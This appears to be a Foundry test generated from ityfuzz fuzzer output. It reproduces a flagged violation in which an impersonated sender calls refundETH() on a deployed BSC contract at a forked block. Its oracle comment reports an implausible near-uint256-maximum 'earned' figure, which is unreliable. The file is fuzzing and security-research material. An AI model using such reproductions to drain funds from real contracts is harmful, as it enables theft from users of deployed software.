// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0xe1272a840F574b68dE861eC5009784e3411cb96c,0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840,0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d,0x5336a15f27b74f62cc182388c005df419ffb58b8,0x4f3126d5DE26413AbDCF6948943FB9D0847d9818,0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD,0x1f415255f7E2a8546559a553E962dE7BC60d7942,0x1f415255f7e2a8546559a553e962de7bc60d7942 -c bsc --onchain-block-number 29906109 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 115792089237316195423570985008687907853269984665640564039457584007913129639935000000 more than owed 0, net earned = 115792089237316195423570985008687907853269984665640564039457584007913129639935000000wei (115792089237316195423570985008687907853269984665640564039457ETH)

================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] 0x46A15B0b27311cedF172AB29E4f4766fbE7F4364.refundETH()
   │  ├─[2] [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd.fallback()
   │  │  └─ ← ()


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 29906109);
    }

    function test() public {

        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        
        0x46A15B0b27311cedF172AB29E4f4766fbE7F4364.call(abi.encodeWithSignature(
            "refundETH()"
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

